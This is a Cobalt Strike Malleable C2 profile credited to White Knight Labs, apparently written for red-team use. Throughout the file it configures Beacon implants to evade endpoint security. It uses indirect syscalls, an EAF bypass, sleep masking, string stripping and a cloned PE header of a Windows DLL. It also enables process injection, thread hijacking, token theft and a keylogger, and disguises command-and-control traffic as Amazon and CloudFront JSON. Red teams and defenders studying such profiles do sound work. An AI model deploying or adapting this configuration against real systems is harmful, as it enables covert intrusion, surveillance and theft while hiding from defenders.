## Author: Kleiton - White Knight Labs

################################################
## Auxiliary Settings
################################################
set sample_name "WKL C2 Profile";
set host_stage "false";  # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.
set pipename "Winsock2\\CatalogChangeListener-###-0";
set pipename_stager "TSVCPIPE-########-####-4###-####-############";
set useragent "<RAND>"; # "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"; Use random Internet Explorer UA by default
set create_remote_thread "true"; # Allow beacon to create threads in other processes
set hijack_remote_thread "true"; # Allow beacon to run jobs by hijacking the primary thread of a suspeneded process
set tasks_max_size "2097152"; # Set to 2MB (in bytes) to avoid the OPSEC warning. Increase if needed.
set steal_token_access_mask "0"; # TOKEN_ALL_ACCESS (or use "11")
set tcp_frame_header "\x80";

################################################
## Beacon Sleep Settings
################################################
set sleeptime "30000";  # Choose a value that fits your needs. A great value is recommended.
set jitter "33";        # Default jitter factor (0-99%). A great value is recommended.

################################################
## SSH Banner
################################################
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "LOCAL\\cubeb-pipe-####-##";

################################################
## Beacon Config
################################################
stage {
    set allocator         "MapViewOfFile";
    set cleanup           "true";
    set rdll_loader       "PrependLoader"; #PrependLoader enable the use of eaf_bypass and rdll_use_syscalls
    set rdll_use_syscalls "true";
    set eaf_bypass        "true";
    set cleanup           "true";
    set data_store_size   "32";
    set sleep_mask        "true";
    set syscall_method    "indirect";
    set copy_pe_header    "true";          # Optional
    #set smartinject       "true";         # bypass EMET: pass key function pointers to its post-exploitation tools, when they're known (Disabled when PrependLoader is used)
    beacon_gate {
        All;
    }
    
    # OPSEC Note: Use the magic_header python script to generate values (https://github.com/WKL-Sec/Malleable-CS-Profiles/magic_mz.py)
    # For more details about the values, please refer to the official documentation: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_pe-memory-indicators.htm
    set magic_mz_x86 "RZME";
    set magic_mz_x64 "QY";
    
    set magic_pe        "##";     # Set to random values to avoid signature detections (limited to 2 characters)
    set userwx 	        "false";
    set sleep_mask	    "true";
    set stomppe	        "true";   # Otherwise easy detection
    set obfuscate	    "true";
    
    ### Module Stomping configuration ###
    #set module_x86 "wwanmm.dll";
    #set module_x64 "wwanmm.dll";
    #set stomppe    "true";        # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
    
    ### PE Header Clone Config - making the reflective DLL look like a specific DLL in memory ###
    ### Use dll_parse.py from WKL to parse the values from a DLL
    set name "ActivationManager.dll";
    set checksum "714538";
    set compile_time "18 Apr 2048 10:28:24";
    set entry_point "128240";
    set image_size_x64 "716800";
    set image_size_x86 "716800";
    set rich_header "\xb3\x03\xdf\x61\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xfe\x1a\x22\x32\x50\x62\xb1\x32\x92\x04\xb5\x33\xef\x62\xb1\x32\x92\x04\xb2\x33\xf4\x62\xb1\x32\x92\x04\xb4\x33\xeb\x62\xb1\x32\xf7\x62\xb0\x32\x10\x67\xb1\x32\x92\x04\xb0\x33\xff\x62\xb1\x32\x92\x04\xb1\x33\xf6\x62\xb1\x32\x92\x04\xbf\x33\xa5\x62\xb1\x32\x92\x04\x4c\x32\xf6\x62\xb1\x32\x92\x04\x4e\x32\xf6\x62\xb1\x32\x92\x04\xb3\x33\xf6\x62\xb1\x32";
    
    ### Beacon export obfuscation routing ###
    ### Change to your liking, as long as RC4 "128" is present. ###
    transform-obfuscate {
        lznt1;      # LZNT1 compression
        rc4 "128";  # RC4 encryption - Key length parameter: 8-2048
        xor "64";   # xor encryption - Key length parameter: 8-2048
        #base64;     # encodes using base64 encoding
    }
    
    ### String removal config ###
    # The following configuration will remove the presence of the strings from the exported beacon
    transform-x86 {
        strrep "%c%c%c%c%c%c%c%c%cMSSE-%d-server" "";
        strrep "Argument domain error (DOMAIN)" "";
        strrep "Argument singularity (SIGN)" "";
        strrep "Overflow range error (OVERFLOW)" "";
        strrep "Partial loss of significance (PLOSS)" "";
        strrep "Total loss of significance (TLOSS)" "";
        strrep "The result is too small to be represented (UNDERFLOW)" "";
        strrep "Unknown error" "";
        strrep "_matherr(): %s in %s(%g, %g)" "";
        strrep "(retval=%g)" "";
        strrep "Mingw-w64 runtime failure:" "";
        strrep "Address %p has no image-section" "";
        strrep "VirtualQuery failed for %d bytes at address %p" "";
        strrep "VirtualProtect failed with code 0x%x" "";
        strrep "Unknown pseudo relocation protocol version %d." "";
        strrep "Unknown pseudo relocation bit size %d." "";
    }
        
    transform-x64 {
        strrep "Argument domain error (DOMAIN)" "";
        strrep "Argument singularity (SIGN)" "";
        strrep "Overflow range error (OVERFLOW)" "";
        strrep "Partial loss of significance (PLOSS)" "";
        strrep "Total loss of significance (TLOSS)" "";
        strrep "The result is too small to be represented (UNDERFLOW)" "";
        strrep "Unknown error" "";
        strrep "_matherr(): %s in %s(%g, %g)" "";
        strrep "(retval=%g)" "";
        strrep "Mingw-w64 runtime failure:" "";
        strrep "Address %p has no image-section" "";
        strrep "VirtualQuery failed for %d bytes at address %p" "";
        strrep "VirtualProtect failed with code 0x%x" "";
        strrep "Unknown pseudo relocation protocol version %d." "";
        strrep "Unknown pseudo relocation bit size %d." "";
    }
}

################################################
## Post Exploitation Settings
################################################
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
    set pipename "Winsock2\\CatalogChangeListener-###-0";
    set obfuscate "true";
    set smartinject "true";
    set cleanup "true";
    set amsi_disable "false"; #Recommended to Patch AMSI yourself
    set keylogger "GetAsyncKeyState";
    
    # Enable one of the following options for starting a spoofed thread
    #set threadhint "ntdll.dll!RtlUserThreadStart+0x21"
    #set threadhint "kernel32.dll!BaseThreadInitThunk+0x14"
}

################################################
## Process Injection
################################################
process-inject {
  set allocator "VirtualAllocEx"; #or NtMapViewOfSection ( NtMapViewOfSection option is for same-architecture injection only. VirtualAllocEx is always used for cross-arch memory allocations. )
  set startrwx "false";
  set userwx "false";
  set bof_allocator "HeapAlloc";  #Specify VirtualAlloc, MapViewOfFile, or HeapAlloc. 
  set bof_reuse_memory "true";
  set min_alloc "16384";

  #Use the prepend.py script from WKL github to generate a dynamic prepend value (support x64 only)
  #https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/prepend.py
  transform-x86 {
          prepend "\x90\x90";
          #append
  }

  transform-x64 {
          prepend "\x66\x87\xd2\x44\x48\x40\x90\x66\x87\xc9\x46\x66\x0f\x1f\x04\x00\x0f\x1f\x00\x45\x0f\x1f\x04\x00\x41\x87\xdb\x66\x87\xdb\x40\x42\x49\x87\xd2\x43\x4c\x87\xc9\x0f\x1f\x00\x47\x66\x90\x0f\x1f\x00";
          #append
  }

  # The following execution block can be considered safe to use 
  execute {
      ObfSetThreadContext "ntdll!TpReleaseCleanupGroupMembers+0x450";
      CreateThread "ntdll!RtlUserThreadStart+0x42";
      SetThreadContext;
  }
}

#------------
################################################
## SSL CERTIFICATE
################################################
## Description:
##    Signed or self-signed TLS/SSL Certifcate used for C2 communication using an HTTPS listener
## Defaults:
##    All certificate values are blank
## Guidelines:
##    - Best Option - Use a certifcate signed by a trusted certificate authority
##    - Ok Option - Create your own self signed certificate
##    - Option - Set self-signed certificate values
https-certificate {
# Self Signed Certificate Options
#       set CN       "*.azureedge.net";
#       set O        "Microsoft Corporation";
#       set C        "US";
#       set L        "Redmond";
#       set ST       "WA";
#       set OU       "Organizational Unit";
#       set validity "365";

# Imported Certificate Options
#        set keystore "domain.store";
#        set password "password";
}

################################################
## Amazon HTTP Profile
################################################
###HTTP-Config Block###
http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";
#
    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

###HTTP-GET Block###
http-get {

    set uri "/broadcast";
    
    client {

        #header "Host" "d23tl967axkois.cloudfront.net";
        header "Accept" "application/json, text/plain, */*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Origin" "https://www.amazon.com";
        header "Referer" "https://www.amazon.com";
        header "Sec-Fetch-Dest" "empty";
        header "Sec-Fetch-Mode" "cors";
        header "Sec-Fetch-Site" "cross-site";
        header "Te" "trailers";

	   
    metadata {
        base64;
	
        header "x-amzn-RequestId";

    }

    }

    server {
    
        header "Content-Type" "application/json";
        header "Access-Control-Allow-Origin" "https://www.amazon.com";
        header "Access-Control-Allow-Methods" "GET";
        header "Access-Control-Allow-Credentials" "true";
        header "X-Amz-Version-Id" "null";
        header "Server" "AmazonS3";
        header "X-Cache" "Hit from cloudfront";
 
        output {

            base64;
            
            prepend "
{\"broadcastEventsData\":{
  \"54857e6d-c060-4b3c-914a-87adfcde093e\":{
  \"lcid\":null,
  \"chatStatus\":\"DISABLED\",
  \"isChatEnabled\":false,
  \"isCarouselEnabled\":null,
  \"highlightedSegmentItemId\":\"";
            
            append "\"";
            append "
  },
  \"B07YF1TNL7\":{
    \"promotions\":null,
    \"percentClaimed\":0,
    \"primeAccessType\":null,
    \"endDate\":\"1970-01-01T00:00:00Z\",
    \"primeBenefitSaving\":null,
    \"dealId\":\"2b2f3426\",
    \"percentOff\":15,
    \"state\":\"\",
    \"dealPrice\":{
      \"fractionalValue\":20,
      \"currencySymbol\":\"$\",
      \"wholeValue\":89
    },
    \"dealType\":\"BEST_DEAL\",
    \"listPrice\":{
      \"fractionalValue\":99,
      \"currencySymbol\":\"$\",
      \"wholeValue\":104
      },
      \"primeExclusive\":false
    },
    \"B071CQCBBN\":{
      \"promotions\":null,
      \"percentClaimed\":0,
      \"primeAccessType\":null,
      \"endDate\":\"1970-01-01T00:00:00Z\",
      \"primeBenefitSaving\":null,
      \"dealId\":\"09a7bbc8\",
      \"percentOff\":15,
      \"state\":\"\",
      \"dealPrice\":{
        \"fractionalValue\":99,
        \"currencySymbol\":\"$\",
        \"wholeValue\":84
      },
      \"dealType\":\"BEST_DEAL\",
      \"listPrice\":{
        \"fractionalValue\":99,
        \"currencySymbol\":\"$\",
        \"wholeValue\":99
      },
      \"primeExclusive\":false
    }
  },
  \"throttled\":false
 },
 \"isLiveBadgeEnabled\":null,
 \"liveViewers\":-1,
 \"interactiveEvents\":[
 ],
 \"vods\":null,
 \"hlsUrl\":
 \"https://d22u79neyj432a.cloudfront.net/bfc50dfa-8e10-44b5-ae59-ac26bfc71489/54857e6d-c060-4b3c-914a-87adfcde093e.m3u8\"
  }
 },
 \"version\":\"1.0\"
}";
	  

            print;
        }
    }
}


###HTTP-Post Block###
http-post {
    
    set uri "/1/events/com.amazon.csm.csa.prod";
    #set verb "GET";
    set verb "POST";

    client {

	#header "Host" "unagi.amazon.com";
	header "Accept" "*/*";
	#header "Accept-Language" "en-US,en;q=0.5";
	#header "Content-Type" "text/plain;charset=UTF-8";
	header "Origin" "https://www.amazon.com";
        
        output {
            base64url;
            
            prepend "{\"events\":[{\"data\":{\"schemaId\":\"csa.VideoInteractions.1\",\"application\":\"Retail:Prod:,\"requestId\":\"MBFV82TTQV2JNBKJJ50B\",\"title\":\"Amazon.com. Spend less. Smile more.\",\"subPageType\":\"desktop\",\"session\":{\"id\":\"133-9905055-2677266\"},\"video\":{\"id\":\"";

            append "\"\n";
            append "\"playerMode\":\"INLINE\",\"videoRequestId\":\"MBFV82TTQV2JNBKJJ50B\",\"isAudioOn\":\"false\",\"player\":\"IVS\",\"event\":\"NONE\"}}}}]}";

	    
	    print;
	    
        }

        id {
	    base64url;
            #parameter "id";
            header "x-amz-rid";

        }
    }

    server {
    
        header "Server" "Server";
        header "Content-Type" "application/json";
        header "Connection" "close";
        header "Access-Control-Allow-Origin" "https://www.amazon.com";
        header "Access-Control-Expose-Headers" "x-amzn-RequestId,x-amzn-ErrorType,x-amzn-ErrorMessage,Date";
        header "Access-Control-Allow-Credentials" "true";
        header "Vary" "Origin,Content-Type,Accept-Encoding,X-Amzn-CDN-Cache,X-Amzn-AX-Treatment,User-Agent";
        header "Permissions-Policy" "interest-cohort=()";

        output {
            netbios;	    
	   
	    prepend "\n";
	    prepend "{";
	    
	    append "\n";
	    append "}";

            print;
        }
    }
}



###HTTP-Stager Block###
http-stager {
	set uri_x86 "/1/Events/com.amazon.csm.csa.prod";
	set uri_x64 "/2/events/com.amazon.csm.csa.prod";
    
    client {

        #header "Host" "unagi.amazon.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Connection" "close";
    }
    
    server {
    
    	header "Content-Type" "application/json";
        header "Access-Control-Allow-Origin" "https://www.amazon.com";
        header "Access-Control-Allow-Methods" "GET";
        header "Access-Control-Allow-Credentials" "true";
        header "X-Amz-Version-Id" "null";
        header "Server" "AmazonS3";
        header "X-Cache" "Hit from cloudfront";
    
    	output {
    	
    		print;
    	}
    }
}

